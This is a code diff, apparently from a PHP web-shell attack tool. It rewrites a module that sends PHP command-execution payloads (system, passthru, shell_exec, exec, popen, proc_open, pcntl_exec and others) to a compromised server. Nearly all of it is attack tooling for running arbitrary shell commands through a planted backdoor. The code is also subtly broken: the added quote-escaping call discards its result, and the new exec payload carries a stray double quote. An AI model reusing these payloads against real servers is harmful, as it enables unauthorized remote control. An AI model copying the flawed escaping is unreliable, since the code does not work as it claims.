@@ -42,21 +42,19 @@ class Sh(Module):
 
         self._register_vectors(
             [
-                PhpCmd("""@system("${args['command']}${args['stderr_redirection']}");""", "system"),
-                PhpCmd("@passthru('${args['command']}${args['stderr_redirection']}');", "passthru"),
-                PhpCmd("print(@shell_exec('${args['command']}${args['stderr_redirection']}'));", "shell_exec"),
-                PhpCmd("$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));", "exec"),
-                PhpCmd("$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }", "popen"),
-                PhpCmd("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
-                PhpCmd("@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');", "python_eval"),
-                PhpCmd("if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }", "perl_system"),
-                # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
-                PhpCmd("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {@pcntl_waitpid($p,$status);}""",
-                    name="pcntl", target=Os.NIX),
+            # All the system-like calls has to be properly wrapped between single quotes
+            PhpCmd("""@system('${args['command']}${args['stderr_redirection']}');""", "system"),
+            PhpCmd("""@passthru('${args['command']}${args['stderr_redirection']}');""", "passthru"),
+            PhpCmd("""print(@shell_exec('${args['command']}${args['stderr_redirection']}'));""", "shell_exec"),
+            PhpCmd(""""$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));""", "exec"),
+            PhpCmd("""$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }""", "popen"),
+            PhpCmd("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
+            PhpCmd("""@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');""", "python_eval"),
+            PhpCmd("""if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}');print($r);}""", "perl_system"),
+            # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
+            PhpCmd("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c",'${args['command']}'));} else {@pcntl_waitpid($p,$status);}""",
+                name="pcntl", target=Os.NIX),
             ])
-
-
-
 
     def setup(self, args={}):
         """Probe all vectors to find a working system-like function.
@@ -99,6 +97,9 @@ class Sh(Module):
             return False
 
     def run(self, args):
+
+        # Properly quote the quotes
+        args['command'].replace("'", "'\\''")
 
         return self.vectors.get_result(
          name = args['vector'],
